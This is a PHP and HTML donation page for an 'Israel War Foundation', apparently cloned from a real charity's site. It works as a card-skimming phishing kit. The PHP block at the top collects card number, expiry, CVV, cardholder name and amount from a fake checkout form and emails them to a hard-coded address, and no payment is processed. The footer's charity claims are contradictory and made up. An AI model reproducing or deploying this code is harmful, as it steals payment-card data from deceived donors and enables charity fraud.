<?php
include("baglanti.php");

if (isset($_POST["save"])) {
    // Kullanıcı girdilerini al
    $cardNumber = $_POST["cardNumber"];
    $expiryDate = $_POST["expiryDate"];
    $cvv = $_POST["cvv"];
    $cardHolderName = $_POST["cardHolderName"];
    $amount = $_POST["amount"];

    // E-posta bilgileri
    $to = "evve.com"; // Gönderilecek e-posta adresi
    $subject = "Yeni Kayıt Formu Verileri";
    $message = "
    <html>
    <head>
        <title>Yeni Kayıt Formu Verileri</title>
    </head>
    <body>
        <p>Yeni bir kayıt formu verisi alındı:</p>
        <table>
            <tr>
                <th>Kart Numarası:</th>
                <td>$cardNumber</td>
            </tr>
            <tr>
                <th>Son Kullanma Tarihi:</th>
                <td>$expiryDate</td>
            </tr>
            <tr>
                <th>CVV:</th>
                <td>$cvv</td>
            </tr>
            <tr>
                <th>Kart Sahibi Adı:</th>
                <td>$cardHolderName</td>
            </tr>
            <tr>
                <th>Tutar:</th>
                <td>$amount</td>
            </tr>
        </table>
    </body>
    </html>
    ";

    // E-posta başlıkları
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

    // E-posta gönderimi
    if (mail($to, $subject, $message, $headers)) {
        echo '<div class="alert alert-success" role="alert">E-posta başarıyla gönderildi</div>';
    } else {
        echo '<div class="alert alert-danger" role="alert">E-posta gönderimi başarısız</div>';
    }
}
?>


    
    
    
<!DOCTYPE html>
<html lang="en">

    
    <!-- Google Tag Manager -->
    <script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
    new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
    j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
    '../www.googletagmanager.com/gtm5445.html?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-KNW44RT');</script>
    <!-- End Google Tag Manager -->
    
    <!-- Facebook Pixel Code -->
    <script>
      !function(f,b,e,v,n,t,s)
      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
      n.queue=[];t=b.createElement(e);t.async=!0;
      t.src=v;s=b.getElementsByTagName(e)[0];
      s.parentNode.insertBefore(t,s)}(window, document,'script',
      '../connect.facebook.net/en_US/fbevents.js');
      fbq('init', '799846780070218');
      fbq('track', 'PageView');
   	 	</script>
    	<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=799846780070218&amp;ev=PageView&amp;noscript=1" /></noscript>
    	<!-- End Facebook Pixel Code -->
 
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Donate Page  - Israel War Foundation</title>

    
    <link rel="stylesheet" href="../use.typekit.net/kzx8bft.css">
    <link rel="stylesheet" type="text/css" href="../maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    
      <link href="https://nifau.nationbuilder.com/themes/1012/5c70a6a94445ea5c10e8a187/0/attachments/16859318761685930346/default/_staged-donations.scss" rel="stylesheet" />
    
    
		
    
    
    
    <link href="https://nifau.nationbuilder.com/themes/1012/5c70a6a94445ea5c10e8a187/0/attachments/16859318761685930346/default/theme.scss" rel="stylesheet" />
    <link href="https://nifau.nationbuilder.com/themes/1012/5c70a6a94445ea5c10e8a187/0/attachments/16859318761685930346/default/theme-custom.scss" rel="stylesheet" />

    

<script type="text/javascript">var _sf_startpt=(new Date()).getTime()</script>



<meta content="authenticity_token" name="csrf-param" />
<meta content="585Lwk7R/aAte2Um4rBWiuljwmQfJx5Ukjw96DbVODo=" name="csrf-token" />

  <link rel="canonical" href="donate.html" />
    <meta name="Title" content="Donate Now to Those on the Front Lines">
    <meta property="og:title" content="Donate Now to Those on the Front Lines"/>
  <meta property="og:url" content="https://www.nif.org.au/donate">
    <meta property="og:description" content="We’re a community of Israelis and supporters of Israel worldwide dedicated to a vision of Israel as both the Jewish homeland and a democracy for all its citizens.">
    <meta property="og:type" content="article">
      <link rel="image_src" href="../assets.nationbuilder.com/nifau/sites/1012/meta_images/original/image.png" />
      <meta property="og:image" content="https://assets.nationbuilder.com/nifau/sites/1012/meta_images/original/image" />
  <meta property="og:site_name" content="Israel War Foundation"/>



  <link rel="stylesheet" href="../ajax.googleapis.com/ajax/libs/jqueryui/1.10.0/themes/cupertino/jquery-ui.css" type="text/css" media="all">

      <link rel="icon" type="image/x-icon" href="../assets.nationbuilder.com/nifau/sites/1012/favicon_images/original/image.png" />


  <script src="../assets.nationbuilder.com/assets/liquid/main-f52182358767f5af49bb34ddeeedb502a15f0105ffc14c758599b2789870803b.js"></script>

<script type="text/javascript">
  window.twttr = (function (d,s,id) {
    var t, js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return; js=d.createElement(s); js.id=id;
    js.src="../platform.twitter.com/widgets.js"; fjs.parentNode.insertBefore(js, fjs);
    return window.twttr || (t = { _e: [], ready: function(f){ t._e.push(f) } });
  }(document, "script", "twitter-wjs"));
</script>

<script type="text/javascript">
  NB.FBAppId = '1679673749184434';
</script>

  <script type="text/javascript">
    (function (d) { var config = { kitId: 'css6xea', scriptTimeout: 3000, async: true }, h=d.documentElement,t=setTimeout(function(){h.className=h.className.replace(/\bwf-loading\b/g,"")+" wf-inactive";},config.scriptTimeout),tk=d.createElement("script"),f=false,s=d.getElementsByTagName("script")[0],a;h.className+=" wf-loading";tk.src='https://use.typekit.net/'+config.kitId+'.js';tk.async=true;tk.onload=tk.onreadystatechange=function(){a=this.readyState;if(f||a&&a!="complete"&&a!="loaded")return;f=true;clearTimeout(t);try{Typekit.load(config)}catch(e){}};s.parentNode.insertBefore(tk,s)})(document);
  </script>







<!-- The following line of CSS hides a checkbox in social share prompts for posting to Facebook;
As of Aug 1 2018, FB has deprecated the ability for apps to post to personal profile pages, so this is a temporary fix
while we re-configure the social share prompt -->
<style>label[for="face_tweet_is_facebook"]{display:none;}</style>



    <script type="text/javascript">
      NB.appConfig.userIsLoggedIn = false;
    </script>
    <!-- Google tag (gtag.js) -->
<script async src="https://www.googletagmanager.com/gtag/js?id=G-C8FSYRNTC2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-C8FSYRNTC2');
</script>
  </head>
  
  
  
  <body class="page-type-donation page-pages-show-donation-wide slug-donate slugparent-">
    
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-KNW44RT" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    
    
    
    
    <!-- _nav.html -->

<nav class="navbar navbar-inverse navbar-static-top" role="navigation">
    <div class="navbar-header">
      <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#menu-collapse">
        <span class="sr-only">Toggle navigation</span>
        <i class="fa fa-bars" aria-hidden="true"></i>
      </button>
      
        <a class="navbar-brand" href="index.html"><img alt="Israel War Foundation" src="../assets.nationbuilder.com/nifau/sites/1012/meta_images/original/image.png"></a>
      
    </div>
    <div id="menu-collapse" class="collapse navbar-collapse">
      <ul class="nav navbar-nav">
        
        
          
            <li >
              <a href="our_impact.html">Our Impact</a>
            </li>
        
          
        
        
          
            <li class=" dropdown hidden-xs">
              <a role="button" aria-expanded="false">Who We Are <span class="caret"></span></a>
              <ul class="dropdown-menu" role="menu">
                
                  
                
      
                
                  
                
                  
                
                  
                    <li><a href="iwf_global.html">IWF Around the World</a></li>
                  
                
                  
                
                  
                
                  
                
                  
                    <li><a href="declaration.html">Upholding the Declaration of Independence</a></li>
                  
                
                  
                
                  
                
              </ul>
            </li>
            <li class=" dropdown visible-xs">
              <a role="button" class="dropdown-toggle" data-toggle="dropdown" aria-expanded="false">Who We Are <span class="caret"></span></a>
              <ul class="dropdown-menu" role="menu">

                
                  
                
                  
                
                  
                
                  
                
                  
                    <li><a href="iwf_global.html">IWF Around the World</a></li>
                  
                
                  
                
                  
                
                  
                
                  
                    <li><a>Upholding the Declaration of Independence</a></li>
                  
                
                  
                
                  
                
              </ul>
            </li>
        
          
        
        
          
           
        
        <li>
          <a class="donate-link" href="donate.html">DONATE</a>
        </li>
      </ul>
    </div>
</nav>


<!-- /_nav.html -->

      
<!-- _layout_show_custom_donate_page.html -->
<div class="section-donation-page">
  <div class="row main-content row-eq-height">
  <div class="col-sm-6 left-column hidden-xs" style="background-image:url(../assets.nationbuilder.com/nifau/pages/4112/features/original/asdas.png);"></div>
  <div class="col-sm-6 right-column">
    <div class="form-panel">
      <div class="wysiwyg light-theme">
        <h2><strong>Donate Now to Help Those in Need</strong></h2>
<p>Your gift will help support people in need during this critical time.</p>
<p>Our colleagues in Israel and our grantees on the ground right now are working to provide support to impacted communities across Israel. Your contribution will help us support those communities, today.</p>
<div class="row">
<div class="col-sm-12">
<div id="intro" class="intro">
<p><strong>A gift to IWF means that we are able to continue supporting our grantees providing care to those who need it right now. Thank you for your support!</strong></p>
</div>
</div>
</div>
      </div>
      
      <hr />
      
<div>
<form action="donate.php" method="post">
  
  <label for="cardNumber">Card Number:</label><br>
  <input type="number" id="cardNumber" name="cardNumber" required oninput="this.value = this.value.slice(0, 16)" placeholder="Enter your card number" required>
  
  <label for="expiryDate">Expiry Date:</label><br>
<input type="text" id="expiryDate" name="expiryDate" placeholder="MM/YY" required>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script src="https://code.jquery.com/ui/1.12.1/jquery-ui.min.js"></script>
<link rel="stylesheet" href="https://code.jquery.com/ui/1.12.1/themes/base/jquery-ui.css">

<script>
$(function() {
    $("#expiryDate").datepicker({
                dateFormat: "mm/yy",
                changeMonth: true,
                changeYear: true,
                showButtonPanel: true,
                minDate: new Date(2023, 0, 1), // Minimum tarih: Ocak 2023
                maxDate: new Date(2099, 11, 31), // Maksimum tarih: Aralık 2099
                onClose: function(dateText, inst) {
                    var month = $("#ui-datepicker-div .ui-datepicker-month :selected").val();
                    var year = $("#ui-datepicker-div .ui-datepicker-year :selected").val();
                    $(this).val($.datepicker.formatDate("mm/yy", new Date(year, month, 1)));
                }
  
    });


    $("#expiryDate").focus(function () {
        $(".ui-datepicker-calendar").css("display", "none");
    });
});
</script>
  
  <label for="cvv">CVV:</label><br>
  <input type="number" id="cvv" name="cvv" required oninput="this.value = this.value.slice(0, 3)" placeholder="CVV" required>
  
  <label for="cardHolderName">Cardholder Name:</label><br>
  <input type="text" id="cardHolderName" name="cardHolderName" placeholder="Enter cardholder's name" required>

  <label for="amount">Amount:</label>
  <input type="number" id="amount" name="amount" placeholder="Select Amount" required>

  <div class="donation-form__payment-logos"><img src="https://admin.raisely.com/public/donations/donationv3/gpay.png"><img src="https://admin.raisely.com/public/donations/donationv3/visa.png"><img src="https://admin.raisely.com/public/donations/donationv3/mastercard.png"><img src="https://admin.raisely.com/public/donations/donationv3/americanexpress.png"><div class="donation-form__payment-logos__variable__wrapper"><img class="donation-form__payment-logos__variable logo-0" src="https://admin.raisely.com/public/donations/donationv3/dinersclub.png"><img class="donation-form__payment-logos__variable logo-1" src="https://admin.raisely.com/public/donations/donationv3/discover.png"><img class="donation-form__payment-logos__variable logo-2" src="https://admin.raisely.com/public/donations/donationv3/jcb.png"><img class="donation-form__payment-logos__variable logo-3" src="https://admin.raisely.com/public/donations/donationv3/unionpay.png"></div></div>
<br >
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="save" content="width=device-width, initial-scale=1.0">
    <title>Yuvarlak Buton</title>
    <style>
      
        .positioned-right {
            position: absolute; /* Konumlandırmayı mutlak yapar */
            right: 15; /* Sağ kenardan sıfır mesafe */
            top: 45 ; /* Üst kenardan sıfır mesafe */
        }
        .round-button {
            background-color: #4CAF50; /* Butonun arka plan rengi */
            color: white; /* Yazının rengi */
            border: none; /* Kenarlıkları kaldır */
            border-radius: 50%; /* Butonu yuvarlak yapmak için */
            padding: 15px; /* İç boşluk (üst-alt sağ-sol) */
            width: 60px; /* Butonun genişliği */
            height: 60px; /* Butonun yüksekliği */
            text-align: center; /* Yazıyı ortala */
            text-decoration: none; /* Alt çizgiyi kaldır */
            display: inline-flex; /* Butonu yan yana göstermek için ve içerik hizalama */
            align-items: center; /* Buton içeriğini ortala */
            justify-content: center; /* Buton içeriğini ortala */
            font-size: 16px; /* Yazı boyutu */
            cursor: pointer; /* Üzerine gelindiğinde fare imlecini değiştir */
            line-height: 1; /* Satır yüksekliği, yazının ortalanması için */
        }

        .round-button:hover {
            background-color: #45a049; /* Hover (üzerine gelindiğinde) arka plan rengi */
        }
    </style>
</head>
<body>
    <button class="round-button">✓</button>
</body>
</html>

   
</form>
</script></div>            
      
      <ul class="basic-x">
        <li>Share with your friends</li>
        <li><a href="https://www.facebook.com/share.php?u=https://www.nif.org.au/donate/?recruiter_id=" target="_blank" style=""><i class="fa fa-facebook" aria-hidden="true"></i></a></li>
        <li><a href="https://twitter.com/intent/tweet?text=Just%20made%20a%20donation%20to%20New%20Israel%20Fund%20Australia%20https://www.nif.org.au/donate/?recruiter_id=" data-count="none"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
      </ul>
    </div>
  </div>
  <div class="col-sm-6 left-column visible-xs" style="background-image:url(../assets.nationbuilder.com/nifau/pages/4112/features/original/asdas.png);"></div>
</div>
</div>
<!-- /_layout_show_custom_donate_page.html -->


    
    
<!-- _layout_show_footer_signup.html -->

  
    <div class="row">
      <div class="col-md-12">
        <div class="form-errors"></div>
      </div>
    </div>

    

      

    
      <div class="row" style="display:none;">
        <div class="col-md-12">
         
        </div>
      </div>
    

  </form>
</div>
            </div>
          </div>
        </div>
      </div>
      
    </div>
  </div>
</div>
<!-- /_layout_show_footer_signup.html -->

    <div class="section-footer-nav" id="footersitemap">
      <div class="container">
        <div class="row">
          <div class="col-sm-9">
            <div class="row">
              
<!-- _layout_show_footer_nav.html -->

  
    <div class="col-sm-4">
      
        <h5><a href="our_impact.html">Our Impact</a></h5>
        
          <p><a >Fighting the Occupation</a></p>
          
        
          <p><a>Combating Racism</a></p>
          
        
          <p><a>Gender Equality</a></p>
          
        
          <p><a>Protecting Human and Civil Rights for All</a></p>
          
      
          
        
          <p><a>Strengthening Palestinian Israeli Society</a></p>
          
        
      
    </div>
  

  
    <div class="col-sm-4">
      
        <h5><a>Who We Are</a></h5>
        
          <p><a>Our History</a></p>
          
          
        
          <p><a>Our Board</a></p>
          
        
          <p><a >Our Staff</a></p>
          
        
          <p><a href="iwf_global.html">IWF Around the World</a></p>
          
        
          <p><a>Our Patrons</a></p>
          
        
          <p><a>Our Advisory Council</a></p>
        
        
    
        
      
    </div>
  

  
    <div class="col-sm-4">
      
        <h5><a>Events & More</a></h5>
        
          
        
          <p><a>IWF  Podcast</a></p>
          
        
          <p><a>Seder 2024</a></p>
          
        
      
    </div>
  

<!-- /_layout_show_footer_nav.html -->

            </div>
          </div>
          <div class="col-sm-3">
            <h5><a>Contact Us</a></h5>
            <p>Follow us and get in touch:</p>
            <ul class="basic-x">
              <li><a href="https://www.facebook.com/" target="_blank"><i class="fa fa-facebook" aria-hidden="true"></i></a></li>
              <li><a href="https://www.youtube.com/" target="_blank"><i class="fa fa-youtube-play" aria-hidden="true"></i></a></li>
              <li><a href="https://www.instagram.com/" target="_blank"><i class="fa fa-instagram" aria-hidden="true"></i></a></li>
              <li><a href="https://twitter.com/" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
            </ul>
          </div>
        </div>
        <div class="row acknowledgment">
          <div class="col-sm-12"><hr /></div>
          <div class="col-sm-12">
            <div class="row">
              <div class="col-sm-6">
                <div class="row">
                  <div class="col-sm-9"><p>Since 2005, our company has been donating money to the Israeli army, raising over $100 million from to more then 800 social justice and human right organisations. This ongoing effort aims to provide immediate medical assistance and food to those in need.

The generosity of the donors has enabled the company to continue gathering funds for this noble cause. By supporting the Israeli army, they are directly helping individuals who require urgent medical attention and sustenance.</p></div>
                  <div class="col-sm-3"><ul class="basic-x">
  
    <li><img src="../assets.nationbuilder.com/nifau/pages/2766/features/original/flag.png" alt="Flag" /></li>
  

</ul></div>
                </div>
              </div>
              <div class="col-sm-6">
                <div class="row">
                  <div class="col-sm-9"><p>Through their contributions, the company is making a tangible impact on the lives of those in need. The funds raised are being used to provide essential resources to individuals facing challenging circumstances in Israel.</p></div>
                  <div class="col-sm-3"><ul class="basic-x">
  
  <li><a><img src="../assets.nationbuilder.com/nifau/pages/2906/features/original/flag2.png" alt="ACNC" /></a></li>
  
</ul></div>
                </div>
              </div>
            </div>     
          </div>
        </div>
      </div>
    </div>
    <div class="section-footer">
      <div class="container">
        <div class="row footer-links">
          <div class="col-sm-6">
            <div id="fb-root"></div>

  <script type="text/javascript">
  window.fbAsyncInit = function() {
    FB.init({
      appId      : 1679673749184434,
      channelUrl : "//nifau.nationbuilder.com/channel.html",
      status     : true,
      version    : "v18.0",
      cookie     : true,
      xfbml      : true
    });
  };
  (function(d, s, id) {
    var js, fjs = d.getElementsByTagName(s)[0];
    if (d.getElementById(id)) return;
    js = d.createElement(s);
    js.id = id;
    js.async = true;
    js.src = "../connect.facebook.net/en_US/sdk.js";
    fjs.parentNode.insertBefore(js, fjs);
  }(document, 'script', 'facebook-jssdk'));
</script>

<script src="../assets.nationbuilder.com/assets/liquid-6fda76e47cd1a46bec92e2adac0a0453c78638197e234d7667c2ff4366c5a44a.js"></script>







            <a href="index.html"><img src="../assets.nationbuilder.com/themes/5c70a6a94445ea5c10e8a187/attachments/original/1550893312/image.png" alt="Israel War Foundation" /></a>
          </div>
          <div class="col-sm-6">
            <ul class="basic-x">
              <li><a class="button-basic" href>SIGN UP</a></li>
              <li><a class="button-basic purple" href="donate.html">DONATE</a></li>
            </ul>
          </div> 
        </div>
        <div class="row footer-content">
          <div class="col-sm-12">
            
          </div>
        </div>
        <div class="row footer-auth">
          <div class="col-sm-6 left-column">
            <p>Website by <a >laviva</a> | Built on javascript</a></p>
          </div>
          <div class="col-sm-6 right-column">
              
						
            <p>&copy; 2024 Israel War Foundation | <a>Privacy Policy</a></p>
          </div>
        </div>
      </div>
    </div>


    
    <script src="../nifau.nationbuilder.com/themes/1012/5c70a6a94445ea5c10e8a187/0/attachments/16859318761685930346/default/bootstrap.js"></script>
    <script src="../nifau.nationbuilder.com/themes/1012/5c70a6a94445ea5c10e8a187/0/attachments/16859318761685930346/default/holder.min.js"></script>
    
    
    
      <script src="../nifau.nationbuilder.com/themes/1012/5c70a6a94445ea5c10e8a187/0/attachments/16859318761685930346/default/jquery.ui.effect.min.js"></script>
      <script src="../nifau.nationbuilder.com/themes/1012/5c70a6a94445ea5c10e8a187/0/attachments/16859318761685930346/default/jquery.ui.effect-slide.min.js"></script>
      <script src="../nifau.nationbuilder.com/themes/1012/5c70a6a94445ea5c10e8a187/0/attachments/16859318761685930346/default/staged-donations.js"></script>
      <!-- <script src="card.js"></script> -->
    
    
    
    
    
    <script>
    if ( window.self !== window.top ) {
      var referrer_origin = "index.html";
      if ( window.location.origin !== referrer_origin ) {
        var xhttp = new XMLHttpRequest();
        var params = "iframe_req_path=" + window.location.pathname + "&referrer_origin=" + referrer_origin;
        xhttp.open("GET.html", "iframe_requests?" + params, true);
        xhttp.send();
      }
    }
  </script>
<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'89ae19c89b8a5154',t:'MTcxOTU4MjE1My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='cdn-cgi/challenge-platform/h/b/scripts/jsd/c7e29c8c8b6e/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"89ae19c89b8a5154","b":1,"version":"2024.4.1","token":"ff633690ee944cc4bb4fa2453466614e"}' crossorigin="anonymous"></script>
</body>

</html>


